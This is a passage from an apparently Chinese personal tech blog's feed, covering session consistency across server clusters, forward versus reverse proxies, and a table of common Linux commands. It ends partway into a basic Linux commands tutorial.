src="/2018/07/08/2018-07-08-cookie与session/pic3.png"><p>如上图的登录流程，用户在浏览器输入用户名、密码，点击登录，浏览器会将用户名密码提交到服务器程序进行处理；服务器验证用户名、密码正确后，会返回登录成功信息，并且会修改服务器端的session内容，比如我们将用户ID写入session中，为了方便存储这些session的内容会被序列化成字符串或者二进制保存在文件或者数据库中，这时候大多数情况下服务器在对当前的http请求进行响应时，会返回一个新的sessionid要求浏览器写入本地cookie中，对应的返回的http响应头部信息应该会是是这个样子的set-cookie:PHPSESSID=xxxxxxx,浏览器解析到这个头之后就会在当前生成一个cookie关联当前的域名。</p><h4 id="主要特性-1"><a href="#主要特性-1" class="headerlink" title="主要特性"></a>主要特性</h4><ul><li>存在服务器的一种用来存放用户数据的类HashTable结构（文件、数据库/redis、内存）</li><li>通过Session ID来唯一标识这个HashTable（时间限制默认30分钟，超时后毁掉这个值）</li><li>静态资源不会生成session</li><li>访问服务器一次就更新一次session的最后访问时间，无论是否有对session读写，超时既最后访问时间</li><li>若客户端禁止cookie，Session ID可在url中（附加信息/查询字符串）</li><li>域的支持范围不一样，比方说 <u>a.com</u> 的Cookie在 <u>a.com</u> 下都能用，而 <u>dev.a.com</u> 的Session在 <u>api.a.com</u> 下不能用，解决这个问题的办法是JSONP或者跨域资源共享。</li></ul><h4 id="一致性问题"><a href="#一致性问题" class="headerlink" title="一致性问题"></a>一致性问题</h4><p>单服务器web应用中，session信息只需存在该服务器中，这是我们前几年最常接触的方式，但是近几年随着分布式系统的流行，单系统已经不能满足日益增长的百万级用户的需求，集群方式部署服务器已在很多公司运用起来，当高并发量的请求到达服务端的时候通过负载均衡的方式分发到集群中的某个服务器，这样就有可能导致同一个用户的多次请求被分发到集群的不同服务器上，就会出现取不到session数据的情况，于是session的共享就成了一个问题。</p><img src="/2018/07/08/2018-07-08-cookie与session/pic4.png"><p>如上图，假设用户包含登录信息的session都记录在第一台web-server上，反向代理如果将请求路由到另一台web-server上，可能就找不到相关信息，而导致用户需要重新登录。</p><h5 id="session复制（同步）"><a href="#session复制（同步）" class="headerlink" title="session复制（同步）"></a>session复制（同步）</h5><img src="/2018/07/08/2018-07-08-cookie与session/pic5.png"><p><strong>思路</strong>：多个web-server之间相互同步session，这样每个web-server之间都包含全部的session</p><p><strong>优点</strong>：web-server支持的功能，应用程序不需要修改代码</p><p><strong>缺点</strong>：</p><ul><li>session的同步需要数据传输，占内网带宽，有时延</li><li>所有web-server都包含所有session数据，数据量受内存限制，无法水平扩展</li><li>有更多web-server时要歇菜</li></ul><h5 id="客户端存储法"><a href="#客户端存储法" class="headerlink" title="客户端存储法"></a>客户端存储法</h5><img src="/2018/07/08/2018-07-08-cookie与session/pic6.png"><p><strong>思路</strong>：服务端存储所有用户的session，内存占用较大，可以将session存储到浏览器cookie中，每个端只要存储一个用户的数据了</p><p><strong>优点</strong>：服务端不需要存储</p><p><strong>缺点</strong>：</p><ul><li>每次http请求都携带session，占外网带宽</li><li>数据存储在端上，并在网络传输，存在泄漏、篡改、窃取等安全隐患</li><li>session存储的数据大小受cookie限制</li></ul><p>“端存储”的方案虽然不常用，但确实是一种思路。</p><h5 id="反向代理hash一致性"><a href="#反向代理hash一致性" class="headerlink" title="反向代理hash一致性"></a>反向代理hash一致性</h5><p><strong>思路</strong>：web-server为了保证高可用，有多台冗余，反向代理层能不能做一些事情，让同一个用户的请求保证落在一台web-server上呢？</p><p><strong>方案一：四层代理hash</strong></p><p>反向代理层使用用户ip来做hash，以保证同一个ip的请求落在同一个web-server上</p><img src="/2018/07/08/2018-07-08-cookie与session/pic7.png"><p><strong>方案二：七层代理hash</strong></p><img src="/2018/07/08/2018-07-08-cookie与session/pic8.png"><p>反向代理使用http协议中的某些业务属性来做hash，例如sid，city_id，user_id等，能够更加灵活的实施hash策略，以保证同一个浏览器用户的请求落在同一个web-server上</p><p><strong>优点</strong>：</p><ul><li>只需要改nginx配置，不需要修改应用代码</li><li>负载均衡，只要hash属性是均匀的，多台web-server的负载是均衡的</li><li>可以支持web-server水平扩展（session同步法是不行的，受内存限制）</li></ul><p><strong>不足</strong>：</p><ul><li>如果web-server重启，一部分session会丢失，产生业务影响，例如部分用户重新登录</li><li>如果web-server水平扩展，rehash后session重新分布，也会有一部分用户路由不到正确的session</li><li>session一般是有有效期的，所有不足中的两点，可以认为等同于部分session失效，一般问题不大。</li></ul><p>对于四层hash还是七层hash，个人推荐前者：让专业的软件做专业的事情，反向代理就负责转发，尽量不要引入应用层业务属性，除非不得不这么做（例如，有时候多机房多活需要按照业务属性路由到不同机房的web-server）。</p><h5 id="后端统一集中存储"><a href="#后端统一集中存储" class="headerlink" title="后端统一集中存储"></a>后端统一集中存储</h5><img src="/2018/07/08/2018-07-08-cookie与session/pic9.png"><p><strong>思路</strong>：将session存储在web-server后端的存储层，数据库或者缓存</p><p><strong>优点</strong>：</p><ul><li>没有安全隐患</li><li>可以水平扩展，数据库/缓存水平切分即可</li><li>web-server重启或者扩容都不会有session丢失</li></ul><p><strong>不足</strong>：增加了一次网络调用，并且需要修改应用代码</p><p>对于db存储还是cache，个人推荐后者：session读取的频率会很高，数据库压力会比较大。如果有session高可用需求，cache可以做高可用，但大部分情况下session可以丢失，一般也不需要考虑高可用。</p><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>保证session一致性的架构设计常见方法：</p><ul><li>session同步法：多台web-server相互同步数据</li><li>客户端存储法：一个用户只存储自己的数据</li><li>反向代理hash一致性：四层hash和七层hash都可以做，保证一个用户的请求落在一台web-server上</li><li>后端统一存储：web-server重启和扩容，session也不会丢失</li></ul><p>对于方案3和方案4，个人建议推荐后者：</p><ul><li>web层、service层无状态是大规模分布式系统设计原则之一，session属于状态，不宜放在web层</li><li>让专业的软件做专业的事情，web-server存session？还是让cache去做这样的事情吧。</li></ul>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 会话机制 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>正向代理与反向代理</title>
      <link href="/2018/07/06/2018-07-06-%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86%E4%B8%8E%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/"/>
      <url>/2018/07/06/2018-07-06-%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86%E4%B8%8E%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p><i class="fa fa-quote-left"></i> 正向代理与反向代理 <i class="fa fa-quote-right"></i></p><a id="more"></a><h3 id="为什么使用代理"><a href="#为什么使用代理" class="headerlink" title="为什么使用代理"></a>为什么使用代理</h3><p><strong>代理服务器(proxy server)</strong>提供代理服务的电脑系统或其它类型的网络终端，代替网络用户去取得网络信息，它有以下几点作用：</p><ul><li>提高访问速度：由于目标主机返回的数据会存放在代理服务器的硬盘中，因此下一次客户再访问相同的站点数据时，会直接从代理服务器的硬盘中读取，起到了缓存的作用，尤其对于热门网站能明显提高访问速度。</li><li>防火墙作用：由于所有的客户机请求都必须通过代理服务器访问远程站点，因此可以在代理服务器上设限，过滤掉某些不安全信息。同时正向代理中上网者可以隐藏自己的IP,免受攻击。</li><li>突破访问限制：互联网上有许多开发的代理服务器，客户机在访问受限时，可通过不受限的代理服务器访问目标站点，通俗说，我们使用的翻墙浏览器就是利用了代理服务器，可以直接访问外网。</li></ul><p>在计算机世界，代理又可分为正向代理和反向代理，比如著名的FQ软件Shadowsocks就是一款正向代理软件，全世界前1000的高流量网站都在用的Web服务器Nginx作为反向代理服务器，那么两者之间究竟有什么区别？</p><h3 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h3><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>正向代理是一个位于客户端和原始服务器(origin server)之间的服务器，为了从原始服务器取得内容，客户端向代理发送一个请求并指定目标(原始服务器)，然后代理向原始服务器转交请求并将获得的内容返回给客户端。客户端必须要进行一些特别的设置才能使用正向代理。</p><p>这就类似一个跳板机，代理访问外部资源：</p><img src="/2018/07/06/2018-07-06-正向代理与反向代理/pic1.png"><p>举个例子：我访问不了某网站，但是我能访问一个代理服务器，而这个代理服务器能访问那个我不能访问的网站。于是我先连上代理服务器,告诉他我需要那个无法访问网站的内容，代理服务器去取回来，然后返回给我。从网站的角度，只在代理服务器来取内容的时候有一次记录，有时候并不知道是用户的请求，也隐藏了用户的资料，这取决于代理告不告诉网站。</p><h4 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h4><ul><li>访问原来无法访问的资源，如google</li><li>可以做缓存，加速访问资源</li><li>对客户端访问授权，上网进行认证</li><li>代理可以记录用户访问记录（上网行为管理），对外隐藏用户信息</li></ul><h3 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h3><h4 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h4><p>反向代理（Reverse Proxy）实际运行方式是指以代理服务器来接受internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给internet上请求连接的客户端，此时代理服务器对外就表现为一个服务器。</p><h4 id="作用-1"><a href="#作用-1" class="headerlink" title="作用"></a>作用</h4><p>1、保证内网的安全，可以使用反向代理提供WAF功能，阻止web攻击。大型网站，通常将反向代理作为公网访问地址，Web服务器是内网。</p><img src="/2018/07/06/2018-07-06-正向代理与反向代理/pic2.png"><p>2、负载均衡，通过反向代理服务器来优化网站的负载。</p><img src="/2018/07/06/2018-07-06-正向代理与反向代理/pic3.png"><h3 id="两者区别"><a href="#两者区别" class="headerlink" title="两者区别"></a>两者区别</h3><img src="/2018/07/06/2018-07-06-正向代理与反向代理/pic4.png"><p>备注：正向代理–HTTP代理为多个人提供翻墙服务；反向代理–百度外卖为多个商户提供平台给某个用户提供外卖服务。</p><p>位置不同：</p><ul><li>正向代理，架设在客户机和目标主机之间； </li><li>反向代理，架设在服务器端；</li></ul><p>代理对象不同：</p><ul><li>正向代理，代理客户端，服务端不知道实际发起请求的客户端； </li><li>反向代理，代理服务端，客户端不知道实际提供服务的服务端； </li></ul><p>用途不同 ：</p><ul><li>正向代理，为在防火墙内的局域网客户端提供访问Internet的途径； </li><li>反向代理，将防火墙后面的服务器提供给Internet访问；</li></ul><p>安全性不同：</p><ul><li>正向代理允许客户端通过它访问任意网站并且隐藏客户端自身，因此必须采取安全措施以确保仅为授权的客户端提供服务；</li><li>反向代理都对外都是透明的，访问者并不知道自己访问的是哪一个代理。</li></ul>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux常用命令 - 150个</title>
      <link href="/2018/07/05/2018-07-05-Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4(150%E4%B8%AA)/"/>
      <url>/2018/07/05/2018-07-05-Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4(150%E4%B8%AA)/</url>
      
        <content type="html"><![CDATA[<p><i class="fa fa-quote-left"></i> Linux运维宝典：最常用的150个命令汇总 <i class="fa fa-quote-right"></i></p><a id="more"></a><h3 id="线上查询及帮助命令-2个"><a href="#线上查询及帮助命令-2个" class="headerlink" title="线上查询及帮助命令 - 2个"></a>线上查询及帮助命令 - 2个</h3><table><thead><tr><th align="left">命令</th><th align="left">功能说明</th></tr></thead><tbody><tr><td align="left">man</td><td align="left">查看命令帮助，命令的词典，更复杂的还有info，但不常用。</td></tr><tr><td align="left">help</td><td align="left">查看Linux内置命令的帮助，比如cd命令。</td></tr></tbody></table><h3 id="文件和目录操作命令-18个"><a href="#文件和目录操作命令-18个" class="headerlink" title="文件和目录操作命令 - 18个"></a>文件和目录操作命令 - 18个</h3><table><thead><tr><th align="left">命令</th><th align="left">功能说明</th></tr></thead><tbody><tr><td align="left">ls</td><td align="left">全拼list，功能是列出目录的内容及其内容属性信息。</td></tr><tr><td align="left">cd</td><td align="left">全拼change directory，功能是从当前工作目录切换到指定的工作目录。</td></tr><tr><td align="left">cp</td><td align="left">全拼copy，其功能为复制文件或目录。</td></tr><tr><td align="left">find</td><td align="left">查找的意思，用于查找目录及目录下的文件。</td></tr><tr><td align="left">mkdir</td><td align="left">全拼make directories，其功能是穿件目录。</td></tr><tr><td align="left">mv</td><td align="left">全拼move，其功能是移动或重命名文件。</td></tr><tr><td align="left">pwd</td><td align="left">全拼print working directory，其功能是显示当前工作目录的绝对路径。</td></tr><tr><td align="left">rename</td><td align="left">用于重命名文件。</td></tr><tr><td align="left">rm</td><td align="left">全拼remove，其功能是删除一个或多个文件或目录。</td></tr><tr><td align="left">rmdir</td><td align="left">全拼remove empty directories，功能是删除空目录。</td></tr><tr><td align="left">touch</td><td align="left">创建新的空文件，改变已有文件的时间戳属性。</td></tr><tr><td align="left">tree</td><td align="left">功能是以树形结构显示目录下的内容。</td></tr><tr><td align="left">basename</td><td align="left">显示文件名或目录名。</td></tr><tr><td align="left">dirname</td><td align="left">显示文件或目录路径。</td></tr><tr><td align="left">chattr</td><td align="left">改变文件的扩展属性。</td></tr><tr><td align="left">lsattr</td><td align="left">查看文件扩展属性</td></tr><tr><td align="left">file</td><td align="left">显示文件的类型。</td></tr><tr><td align="left">md5sum</td><td align="left">计算和校验文件的MD5值。</td></tr></tbody></table><h3 id="查看文件及内容处理命令-21个"><a href="#查看文件及内容处理命令-21个" class="headerlink" title="查看文件及内容处理命令 - 21个"></a>查看文件及内容处理命令 - 21个</h3><table><thead><tr><th>命令</th><th>功能说明</th></tr></thead><tbody><tr><td>cat</td><td>全拼concatenate，功能是用于链接多个文件并且打印到屏幕输出或重定向到指定文件中。</td></tr><tr><td>tac</td><td>tac是cat的反向拼写，因此命令的功能为反向显示文件内容。</td></tr><tr><td>more</td><td>分页显示文件内容。</td></tr><tr><td>less</td><td>分页显示文件内容，more命令的相反用法。</td></tr><tr><td>head</td><td>显示文件内容的头部。</td></tr><tr><td>tail</td><td>显示文件内容的尾部。</td></tr><tr><td>cut</td><td>将文件的每一行按指定分隔符分割并输出。</td></tr><tr><td>split</td><td>分割文件为不同的小片段。</td></tr><tr><td>paste</td><td>按行合并文件内容。</td></tr><tr><td>sort</td><td>对文件的文本内容排序。</td></tr><tr><td>uniq</td><td>去除重复行。oldboy</td></tr><tr><td>wc</td><td>统计文件的行数、单词书或字节数。</td></tr><tr><td>iconv</td><td>转换文件的编码格式。</td></tr><tr><td>dos2unix</td><td>将DOS格式文件转化成UNIX格式。</td></tr><tr><td>diff</td><td>全拼difference，比较文件的差异，常用于文本文件。</td></tr><tr><td>vimdiff</td><td>命令行可视化文件比较工具，常用于文本文件。</td></tr><tr><td>rev</td><td>反向输出文件内容。</td></tr><tr><td>grep/egrep</td><td>过滤字符串，三剑客老三。</td></tr><tr><td>join</td><td>将两个文件的相同字段合并。</td></tr><tr><td>tr</td><td>替换或删除字符。</td></tr><tr><td>vi/vim</td><td>命令行文本编辑器。</td></tr></tbody></table><h3 id="文件压缩及解压缩命令-4个"><a href="#文件压缩及解压缩命令-4个" class="headerlink" title="文件压缩及解压缩命令 - 4个"></a>文件压缩及解压缩命令 - 4个</h3><table><thead><tr><th>命令</th><th>功能说明</th></tr></thead><tbody><tr><td>tar</td><td>打包压缩。oldbody</td></tr><tr><td>unzip</td><td>解压问价。</td></tr><tr><td>gzip</td><td>gzip压缩工具。</td></tr><tr><td>zip</td><td>压缩工具。</td></tr></tbody></table><h3 id="信息显示命令-11个"><a href="#信息显示命令-11个" class="headerlink" title="信息显示命令 - 11个"></a>信息显示命令 - 11个</h3><table><thead><tr><th>命令</th><th>功能说明</th></tr></thead><tbody><tr><td>uname</td><td>显示操作系统相关信息的命令。</td></tr><tr><td>hostname</td><td>显示或者设置当前系统的主机名。</td></tr><tr><td>dmesg</td><td>显示开机信息，用于诊断系统故障。</td></tr><tr><td>uptime</td><td>显示系统运行时间及负载。</td></tr><tr><td>stat</td><td>显示文件或文件系统的状态。</td></tr><tr><td>du</td><td>计算磁盘空间使用情况。</td></tr><tr><td>df</td><td>报告文件系统磁盘空间的使用情况。</td></tr><tr><td>top</td><td>实时显示系统资源使用情况。</td></tr><tr><td>free</td><td>查看系统内存。</td></tr><tr><td>data</td><td>显示与设置系统时间。</td></tr><tr><td>cal</td><td>查看日历等时间信息。</td></tr></tbody></table><h3 id="搜索文件命令-4个"><a href="#搜索文件命令-4个" class="headerlink" title="搜索文件命令 - 4个"></a>搜索文件命令 - 4个</h3><table><thead><tr><th>命令</th><th>功能说明</th></tr></thead><tbody><tr><td>which</td><td>查找二进制命令，按环境变量PATH路径查找。</td></tr><tr><td>find</td><td>从磁盘遍历查找文件或目录。</td></tr><tr><td>whereis</td><td>查找二进制命令，按环境变量PATH路径查找。</td></tr><tr><td>locate</td><td>从数据库（/var/lib/mlocate/mlocate.db）查找命令，使用updated更新库。</td></tr></tbody></table><h3 id="用户管理命令-10个"><a href="#用户管理命令-10个" class="headerlink" title="用户管理命令 - 10个"></a>用户管理命令 - 10个</h3><table><thead><tr><th>命令</th><th>功能说明</th></tr></thead><tbody><tr><td>useradd</td><td>添加用户。</td></tr><tr><td>usermod</td><td>修改系统已经存在的用户属性。</td></tr><tr><td>userdel</td><td>删除用户。</td></tr><tr><td>groupadd</td><td>添加用户组。</td></tr><tr><td>passwd</td><td>修改用户密码。</td></tr><tr><td>chage</td><td>修改用户密码有效期限。</td></tr><tr><td>id</td><td>查看用户的uid，gid及归属的用户组。</td></tr><tr><td>su</td><td>切换用户身份。</td></tr><tr><td>visudo</td><td>编辑/etc/sudoers文件的专属命令。</td></tr><tr><td>sudo</td><td>以另外一个用户身份（默认root身份）执行实现在sudoers文件允许的命令。</td></tr></tbody></table><h3 id="基础网络操作命令-11个"><a href="#基础网络操作命令-11个" class="headerlink" title="基础网络操作命令 - 11个"></a>基础网络操作命令 - 11个</h3><table><thead><tr><th>命令</th><th>功能说明</th></tr></thead><tbody><tr><td>telnet</td><td>使用TELENT协议远程登录。</td></tr><tr><td>ssh</td><td>使用SSH加密协议远程登录。</td></tr><tr><td>scp</td><td>全拼secure copy，用于不同主机之间复制文件。</td></tr><tr><td>wget</td><td>命令行下载文件。</td></tr><tr><td>ping</td><td>测试主机之间网络的连通性。</td></tr><tr><td>route</td><td>显示和设置linux系统的路由表。</td></tr><tr><td>ifconfig</td><td>查看、配置、启用或禁用网络接口的命令。</td></tr><tr><td>ifup</td><td>启动网卡。</td></tr><tr><td>ifdown</td><td>关闭网卡。</td></tr><tr><td>netstat</td><td>查看网络状态。</td></tr><tr><td>ss</td><td>查看网络状态。</td></tr></tbody></table><h3 id="深入网络操作命令-9个"><a href="#深入网络操作命令-9个" class="headerlink" title="深入网络操作命令 - 9个"></a>深入网络操作命令 - 9个</h3><table><thead><tr><th>命令</th><th>功能说明</th></tr></thead><tbody><tr><td>nmap</td><td>网络扫描命令。</td></tr><tr><td>lsof</td><td>全名list open files，也就是列举系统中已经被打开的文件。</td></tr><tr><td>mail</td><td>发送和接受邮件。</td></tr><tr><td>mutt</td><td>邮件管理命令。</td></tr><tr><td>nslookup</td><td>交互式查询互联网DNS服务器的命令。</td></tr><tr><td>dig</td><td>查找DNS解析过程。</td></tr><tr><td>host</td><td>查询DNS的命令。</td></tr><tr><td>traceroute</td><td>追踪数据传输路由状况。</td></tr><tr><td>tcpdump</td><td>命令行的抓包工具。</td></tr></tbody></table><h3 id="有关磁盘与文件系统的命令-16个"><a href="#有关磁盘与文件系统的命令-16个" class="headerlink" title="有关磁盘与文件系统的命令 - 16个"></a>有关磁盘与文件系统的命令 - 16个</h3><table><thead><tr><th>命令</th><th>功能说明</th></tr></thead><tbody><tr><td>mount</td><td>挂载文件系统。</td></tr><tr><td>umount</td><td>卸载文件系统。</td></tr><tr><td>fsck</td><td>检查并修复Linux文件系统。</td></tr><tr><td>dd</td><td>转换或复制文件。</td></tr><tr><td>dumpe2fs</td><td>导出ext2/ext3/ext4文件系统信息。</td></tr><tr><td>dump</td><td>ext2/3/4文件系统备份工具。</td></tr><tr><td>fdisk</td><td>磁盘分区命令，适用于2TB以下磁盘分区。</td></tr><tr><td>parted</td><td>磁盘分区命令，没有磁盘大小限制，常用于2TB以下磁盘分区。</td></tr><tr><td>mkfs</td><td>格式化创建Linux文件系统。</td></tr><tr><td>partprobe</td><td>更新内核的硬盘分区表信息。</td></tr><tr><td>e2fsck</td><td>检查ext2/ext3/ext4类型文件系统。</td></tr><tr><td>mkswap</td><td>创建Linux交换分区</td></tr><tr><td>swapon</td><td>启用交换分区。</td></tr><tr><td>swapoff</td><td>关闭交换分区。</td></tr><tr><td>sync</td><td>将内存缓冲区内的数据写入磁盘。</td></tr><tr><td>resize2fs</td><td>调整ext2/ext3/ext4文件系统大小。</td></tr></tbody></table><h3 id="系统权限及用户授权相关命令-4个"><a href="#系统权限及用户授权相关命令-4个" class="headerlink" title="系统权限及用户授权相关命令 - 4个"></a>系统权限及用户授权相关命令 - 4个</h3><table><thead><tr><th>命令</th><th>功能说明</th></tr></thead><tbody><tr><td>chmod</td><td>改变文件或目录权限。</td></tr><tr><td>chown</td><td>改变文件或目录的属主和属组。</td></tr><tr><td>chgrp</td><td>更改文件用户组。</td></tr><tr><td>umask</td><td>显示或设置权限掩码。</td></tr></tbody></table><h3 id="查看系统用户登录信息的命令-7个"><a href="#查看系统用户登录信息的命令-7个" class="headerlink" title="查看系统用户登录信息的命令 - 7个"></a>查看系统用户登录信息的命令 - 7个</h3><table><thead><tr><th>命令</th><th>功能说明</th></tr></thead><tbody><tr><td>whoami</td><td>显示当前有效的用户名称，相当于执行id -un命令。</td></tr><tr><td>who</td><td>显示目前登录系统的用户信息。</td></tr><tr><td>w</td><td>显示已经登录系统的用户列表，并显示用户正在执行的指令。</td></tr><tr><td>last</td><td>显示登入系统的用户。</td></tr><tr><td>lastlog</td><td>显示系统中所有用户最近一次登录信息。</td></tr><tr><td>users</td><td>显示当前登录系统的所有用户的用户列表。</td></tr><tr><td>finger</td><td>查找并显示用户信息。</td></tr></tbody></table><h3 id="内置命令及其它-19个"><a href="#内置命令及其它-19个" class="headerlink" title="内置命令及其它 - 19个"></a>内置命令及其它 - 19个</h3><table><thead><tr><th>命令</th><th>功能说明</th></tr></thead><tbody><tr><td>echo</td><td>打印变量，或直接输出指定的字符串。</td></tr><tr><td>printf</td><td>将结果格式化输出到标准输出。</td></tr><tr><td>rpm</td><td>管理rpm包的命令。</td></tr><tr><td>yum</td><td>自动化简单化地管理rpm包的命令。</td></tr><tr><td>watch</td><td>周期性的执行给定命令，并将命令的输出以全屏方式显示。</td></tr><tr><td>alias</td><td>设置系统别名。</td></tr><tr><td>unalias</td><td>取消系统别名。</td></tr><tr><td>date</td><td>查看或设置系统时间。</td></tr><tr><td>clear</td><td>清除屏幕，简称清屏。</td></tr><tr><td>history</td><td>查看命令执行的历史记录。</td></tr><tr><td>eject</td><td>弹出光驱。</td></tr><tr><td>time</td><td>计算命令执行时间。</td></tr><tr><td>nc</td><td>功能强大的网络工具。</td></tr><tr><td>xargs</td><td>将标准输入转换成命令行参数。</td></tr><tr><td>exec</td><td>调用并执行指令的命令。</td></tr><tr><td>export</td><td>设置或者显示环境变量。</td></tr><tr><td>unset</td><td>删除变量或函数。</td></tr><tr><td>type</td><td>用于判断另外一个命令是否是内置命令。</td></tr><tr><td>bc</td><td>命令行科学计算器。</td></tr></tbody></table><h3 id="系统管理与性能监视命令-9个"><a href="#系统管理与性能监视命令-9个" class="headerlink" title="系统管理与性能监视命令 - 9个"></a>系统管理与性能监视命令 - 9个</h3><table><thead><tr><th>命令</th><th>功能说明</th></tr></thead><tbody><tr><td>chkconfig</td><td>管理Linux系统开机启动项。</td></tr><tr><td>vmstat</td><td>虚拟内存统计。</td></tr><tr><td>mpstat</td><td>显示各个可用CPU的状态统计。</td></tr><tr><td>iostat</td><td>统计系统IO。</td></tr><tr><td>sar</td><td>全面地获取系统的CPU、运行队列、磁盘I/O、分页（交换区）、内存、CPU中断和网络等性能数据。</td></tr><tr><td>ipcs</td><td>用于报告Linux中进程间通信设施的状态，显示的信息包括消息列表、共享内存和信号量的信息。</td></tr><tr><td>ipcrm</td><td>用来删除一个或更多的消息队列、信号量集或者共享内存标识。</td></tr><tr><td>strace</td><td>用于诊断、调试Linux用户空间跟踪器。我们用它来监控用户空间进程和内核的交互，比如系统调用、信号传递、进程状态变更等。</td></tr><tr><td>ltrace</td><td>命令会跟踪进程的库函数调用，它会显现出哪个库函数被调用。</td></tr></tbody></table><h3 id="关机-重启-注销和查看系统信息的命令-6个"><a href="#关机-重启-注销和查看系统信息的命令-6个" class="headerlink" title="关机/重启/注销和查看系统信息的命令 - 6个"></a>关机/重启/注销和查看系统信息的命令 - 6个</h3><table><thead><tr><th>命令</th><th>功能说明</th></tr></thead><tbody><tr><td>shutdown</td><td>关机。</td></tr><tr><td>halt</td><td>关机。</td></tr><tr><td>poweroff</td><td>关闭电源。</td></tr><tr><td>logout</td><td>退出当前登录的shell。</td></tr><tr><td>exit</td><td>退出当前登录的shell。</td></tr><tr><td>Ctrl+d</td><td>退出当前登录的shell的快捷键。</td></tr></tbody></table><h3 id="进程管理相关命令-15个"><a href="#进程管理相关命令-15个" class="headerlink" title="进程管理相关命令 - 15个"></a>进程管理相关命令 - 15个</h3><table><thead><tr><th>命令</th><th>功能说明</th></tr></thead><tbody><tr><td>bg</td><td>将一个在后台暂停的命令，变成继续执行（在后台执行）</td></tr><tr><td>fg</td><td>将后台中的命令调至前台继续运行。</td></tr><tr><td>jobs</td><td>查看当前有多少在后台运行的命令。</td></tr><tr><td>kill</td><td>终止进程。</td></tr><tr><td>killall</td><td>通过进程名终止进程。</td></tr><tr><td>pkill</td><td>通过进程名终止进程。</td></tr><tr><td>crontab</td><td>定时任务命令。</td></tr><tr><td>ps</td><td>显示进程的快照。</td></tr><tr><td>pstree</td><td>树形显示进程。</td></tr><tr><td>nice/renice</td><td>调整程序运行的优先级。</td></tr><tr><td>nohup</td><td>忽略挂起信息运行指定的命令。</td></tr><tr><td>pgrep</td><td>查找匹配条件的进程。</td></tr><tr><td>runlevel</td><td>查看系统当前运行级别。</td></tr><tr><td>init</td><td>切换运行级别。</td></tr><tr><td>service</td><td>启动、停止、重新启动和关闭系统服务，还可以显示所有系统服务的当前状态。</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 计算机操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux基础命令</title>
      <link href="/2018/07/04/2018-07-04-Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/"/>
      <url>/2018/07/04/2018-07-04-Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<p><i class="fa fa-quote-left"></i> 必须掌握的Linux命令 <i class="fa fa-quote-right"></i></p><a id="more"></a><h3 id="基本的文件目录操作"><a href="#基本的文件目录操作" class="headerlink" title="基本的文件目录操作"></a>基本的文件目录操作</h3><p><strong>ls</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ ls <span class="comment">#查看当前目录下文件</span></span><br><span class="line">conf     lnmp_install.sh   README  vhost_ngx_pagespeed.sh</span><br><span class="line">init.sh  ngx_pagespeed.sh  <span class="built_in">source</span>  vhost.sh</span><br><span class="line">$ ls conf <span class="comment">#查看conf目录下文件</span></span><br><span class="line">index.html    nginx.conf      pureftpd-mysql.conf  tz.php</span><br><span class="line">init.d.nginx  pure-ftpd.conf  script.mysql</span><br><span class="line">$ ls -a <span class="comment">#显示所有文件（包含以点（.）开头的隐藏文件，）</span></span><br><span class="line">.   conf     lnmp_install.sh   README  vhost_ngx_pagespeed.sh</span><br><span class="line">..  init.sh  ngx_pagespeed.sh  <span class="built_in">source</span>  vhost.sh</span><br><span class="line">$ ls -l <span class="comment">#以长格式显示文件的详细信息，可以查看文件权限，所属用户，日期等</span></span><br><span class="line">total 60</span><br><span class="line">drwxr-xr-x  2 root root  4096 Jul 25 18:14 conf</span><br><span class="line">-rwxr-xr-x  1 root root  5720 Jul 25 18:14 init.sh</span><br><span class="line">-rwxr-xr-x  1 root root 21011 Jul 25 18:14 lnmp_install.sh</span><br><span class="line">-rwxr-xr-x  1 root root  1983 Jul 25 18:14 ngx_pagespeed.sh</span><br><span class="line">-rw-r--r--  1 root root   392 Jul 25 18:14 README</span><br><span class="line">drwxr-xr-x 15 root root  4096 Jul 27 13:58 <span class="built_in">source</span></span><br><span class="line">-rwxr-xr-x  1 root root  4865 Jul 26 21:58 vhost_ngx_pagespeed.sh</span><br><span class="line">-rwxr-xr-x  1 root root  3774 Jul 25 18:14 vhost.sh</span><br></pre></td></tr></table></figure><p><strong>pwd</strong> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">pwd</span> <span class="comment">#打印当前目录</span></span><br><span class="line">/root/lnmp</span><br></pre></td></tr></table></figure><p><strong>cd</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span 